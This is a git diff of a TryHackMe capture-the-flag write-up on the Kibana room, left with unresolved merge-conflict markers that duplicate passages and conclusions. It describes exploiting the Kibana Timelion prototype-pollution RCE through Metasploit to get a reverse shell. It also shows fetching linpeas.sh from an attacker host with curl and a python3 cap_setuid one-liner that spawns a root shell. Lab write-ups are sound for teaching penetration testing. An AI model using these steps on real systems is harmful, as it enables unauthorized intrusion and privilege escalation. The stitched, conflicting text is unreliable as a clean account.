@@ -28,8 +28,12 @@ Useful resources about vulnerability:
 - https://github.com/LandGrey/CVE-2019-7609
 - https://github.com/mpgn/CVE-2019-7609
 
-For the exploitation phase we have two ways to compromise the target.
-- Manual payload execution on 
+For the exploitation phase we have two manual ways to compromise the target. Besides, you can also use automated approach by using `Metasploit Framework`
+
+- Manual exploitation on `Timelion` data visualiser script executor.
+- Customized script execution.
+- Metasploit Framework: `linux/http/kibana_timelion_prototype_pollution_rce` module.
+
 ### Manual Exploitation - 1
 
 After a couple of research process, I discovered the vulnerability itself which is **Prototype Pollusion** on **Timelion** feature of the **Kibana** - ElasticSearch supported and opensource data visualization platform.
@@ -95,7 +99,7 @@ Now it works ! After I restarted the machine, I was able to get my reverse shell
 
 ### Automated Exploitation
 
-Metasploit Framework offers only three modules for **Kibana** platform. However, first approach was suitable for me. You can reach out the related module in below.
+`Metasploit Framework` offers only three modules for **Kibana** platform. However, first approach was suitable for me. You can reach out the related module in below.
 
 ![](./images/c59ebbaa12eec0413d0a11bff25962e1.png)
 
@@ -115,7 +119,7 @@ show options
 
 ![](./images/c53a369d6204c98af36def3009c7b52d.png)
 
-Modifying the *RHOSTS*, *TARGETURI* and *RPORT* is enough to execute our exploit.
+Modifying the `RHOSTS`, `TARGETURI` and `RPORT` is enough to execute our exploit.
 
 To add necessary information to script settings:
 
@@ -129,34 +133,55 @@ For this scenario, do not forget to modify *RHOSTS*, *LHOST* and *LPORT*.
 
 ![](./images/a20b149b5028537d238919c11e7979b7.png)
 
-Since I forgot to give *LHOST* and *LPORT* option, I was not able to run the script appropriately.
+Since I forgot to give `LHOST` and `LPORT` option, I was not able to run the script appropriately. That's why, do not forget to `set` them.
+
+As you can see below, the script was successfully run:
+
+![[Screen Shot 2024-10-04 at 15.27.38.png]]
+
+Initially, there will not be any output prompted from target ,so do not worry about it. Just check whether you correctly get reverse shell connection or not.
+
+To achieve this just run `ls` command.
 
 
+## Post-Exploitation
 
-I have tried to run linpeas on tmp folder which allows users to run many scripts here ,but in this scenario it does not work. Therefore, I uploaded my files through /home/kiba
+I have tried to run `linpeas.sh` on `tmp` folder which allows users to run many scripts here ,but in this scenario it does not work. Therefore, I uploaded my files through `/home/kiba`. Then it worked !
 
 1. Deploy python server from local
 ```
 python -m http.server 3131
 ```
 
-2. Download linpeas from victim machine
+2. Download `linpeas.sh` from victim machine
 ```
 curl http://10.11.69.113:3131/linpeas.sh -o linpeas.sh
 ```
 
-3. Give executable permission to linpeas.sh
+3. Give executable permission to `linpeas.sh`
 ```
 chmod +x linpeas.sh
 ```
 
-4. Examine carefully  the linpeas output
+4. Examine carefully  the `linpeas` output:
+
 - I found really useful evidence to escalate our privileges
 
+<<<<<<< Updated upstream:TryHackMe/Kibana/Kibana.md
 ![](./images/privilege.PNG)
+=======
+- The crontab shows that the user `kiba` has a cron job scheduled to run every minute. This job navigates to the directory `/home/kiba/kibana/bin` and runs the `bash kibana` command.
+
+![[Screen Shot 2024-10-04 at 11.53.47.png]]
+
+
+
+![[Screen Shot 2024-10-04 at 11.46.43 1.png]]
+>>>>>>> Stashed changes:TryHackMe/Kibana- TryHackMe/Kibana - TryHackMe.md
 
 - The crontab shows that the user Kiba has a cron job scheduled to run every minute. This job navigates to the directory /home/kiba/kibana/bin and runs the bash kibana command.
 
+<<<<<<< Updated upstream:TryHackMe/Kibana/Kibana.md
 ![](./images/1.png)
 
 ![](./images/sudo.png)
@@ -195,3 +220,46 @@ https://gtfobins.github.io/gtfobins/python/
 
 ### Conclusion
 All in all, this article demonstrates how different penetration testing methodologies can be used. From reconnaissance to post-exploitation, I provided three vital pathways for you to understand the idea behind the scene. The detailed steps, ranging from mapping out unusual ports (Kibana) to exploiting vulnerability and escalating privilege show the significance of understanding each phase deeply. Following the steps, applying knowledge practically, and adapting to challenges are crucial. Always remember that careful planning and paying attention to small details, such as setting up the Metasploit console or configuring script parameters correctly, can save you much trouble during the engagement
+=======
+We have possible privilege escalation vector known as Sudo Privileges: 
+Since `kiba` is in the `sudo` group, check what commands you can run with `sudo -l`.
+
+It did not work on this scenario:
+
+```
+	whoami
+	kiba
+	sudo -l
+	sudo: no tty present and no askpass program specified
+```
+
+Furthermore, we have a binary named `/home/kiba/.hackmeplease/python3` which has the capability `cap_setuid+ep`, which means that this Python binary has the ability to change `user IDs (setuid)`. This is a potential privilege escalation vector since it allows the Python process to execute with elevated privileges.
+
+![[Screen Shot 2024-10-04 at 11.56.02.png]]
+
+Let me pay attention on `.hackmeplease` :D
+
+![[Screen Shot 2024-10-04 at 15.45.17.png]]
+
+
+Since we have `python3` binary and its vulnerability. In binary we trust `GFTOBins` to escalate privileges:
+
+- GFTOBins[https://gtfobins.github.io/gtfobins/python/]
+
+
+On `GFTOBins` we have a lot of binaries available to elevate our privileges. However, today we should look for `python` binary. After a deep dive attempts, I recognized that I was dealing with `cap_setuid+ep` capability. Therefore, I thought that it will be suitable to use this payload to escalate my privileges.
+
+![[Screen Shot 2024-10-04 at 15.50.11.png]]
+
+- You can execute following command to be `root` on target.
+
+```
+./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
+
+## Conclusion
+
+All in all, this writeup demonstrates how different methodologies can be used at once. Through reconnaissance to post-exploitation, I provided 3 strong pathway you to understand the idea behind the scene. The detailed steps, ranging from mapping out unusual ports (Kibana) to `exploiting vulnerability` and `escalating privilege`, show the significance of understanding each phase deeply. It's crucial not only to follow the steps meticulously but also to apply knowledge practically and adapt to challenges as they arise. Always remember, careful planning and paying attention to small details, such as setting up the Metasploit console or configuring script parameters correctly, can save you a lot of trouble during the engagement.
+
+May The Pentest Be With You ! !
+>>>>>>> Stashed changes:TryHackMe/Kibana- TryHackMe/Kibana - TryHackMe.md
